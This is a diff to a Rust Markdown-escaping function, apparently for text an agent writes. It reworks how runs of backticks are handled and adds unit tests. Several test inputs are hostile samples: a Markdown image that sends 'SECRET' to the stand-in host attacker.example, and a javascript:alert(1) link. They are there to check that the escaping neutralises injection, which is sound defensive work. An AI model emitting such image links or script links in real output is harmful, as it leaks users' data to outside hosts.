@@ -47,28 +47,48 @@ fn html_escaped(text: &str) -> String {
         .replace('>', "&gt;")
 }
 
-/// A line's text, its closed code spans kept; a backtick left open is
-/// written escaped.
+/// A line's text, its code spans kept: a single backtick and the next
+/// backtick, when single too, around what they hold. Every other backtick
+/// (one of a run, or one left open) is written escaped: the backticks left
+/// as they are only open and close the spans kept, which hold none, so
+/// Markdown pairs them as here, whatever runs the agent wrote.
 fn inline(line: &str) -> String {
-    let parts: Vec<&str> = line.split('`').collect();
-    // An even count of parts: the last backtick opens no span.
-    let closed = if parts.len().is_multiple_of(2) {
-        parts.len() - 1
-    } else {
-        parts.len()
-    };
+    let runs = backtick_runs(line);
     let mut out = String::new();
-    for (i, part) in parts.iter().enumerate() {
-        if i >= closed {
-            out.push_str("\\`");
-            out.push_str(&prose(part));
-        } else if i % 2 == 1 {
-            out.push_str(&format!("`{}`", html_escaped(part)));
-        } else {
-            out.push_str(&prose(part));
+    let mut rest = 0;
+    let mut i = 0;
+    while let Some(&(start, len)) = runs.get(i) {
+        out.push_str(&prose(&line[rest..start]));
+        match runs.get(i + 1) {
+            Some(&(end, 1)) if len == 1 => {
+                out.push_str(&format!("`{}`", html_escaped(&line[start + 1..end])));
+                rest = end + 1;
+                i += 2;
+            }
+            _ => {
+                out.push_str(&"\\`".repeat(len));
+                rest = start + len;
+                i += 1;
+            }
         }
     }
+    out.push_str(&prose(&line[rest..]));
     out
+}
+
+/// Where each run of backticks of `line` starts, and how long it is.
+fn backtick_runs(line: &str) -> Vec<(usize, usize)> {
+    let mut runs: Vec<(usize, usize)> = Vec::new();
+    for (at, c) in line.char_indices() {
+        if c != '`' {
+            continue;
+        }
+        match runs.last_mut() {
+            Some((start, len)) if *start + *len == at => *len += 1,
+            _ => runs.push((at, 1)),
+        }
+    }
+    runs
 }
 
 /// Text outside code: its web links kept, the rest escaped with its
@@ -184,6 +204,24 @@ mod tests {
         );
         // An underscore, a lone star, a backtick left open.
         assert_eq!(from_markdown("a_b * c `d"), "a\\_b \\* c \\`d");
+        // Runs of backticks: escaped one by one, never shifting which
+        // backticks Markdown pairs, so that nothing held between them is
+        // read as an image, a link or emphasis.
+        assert_eq!(
+            from_markdown("x`a```b`![](https://attacker.example/p.png?d=SECRET)`y`"),
+            "x\\`a\\`\\`\\`b`![](https://attacker.example/p.png?d=SECRET)`y\\`"
+        );
+        assert_eq!(
+            from_markdown("``a``![i](https://ex.example/p.png)"),
+            "\\`\\`a\\`\\`\\![i](https://ex.example/p.png)"
+        );
+        assert_eq!(
+            from_markdown("a```b`[clic](javascript:alert(1))`c _it_"),
+            "a\\`\\`\\`b`[clic](javascript:alert(1))`c \\_it\\_"
+        );
+        // Spans side by side with escaped backticks.
+        assert_eq!(from_markdown("`a`b``c`d`"), "`a`b\\`\\`c`d`");
+        assert_eq!(from_markdown("\\`a`"), "\\\\`a`");
         // Bold, then italic.
         assert_eq!(from_markdown("**a** et *b*"), "**a** et *b*");
     }
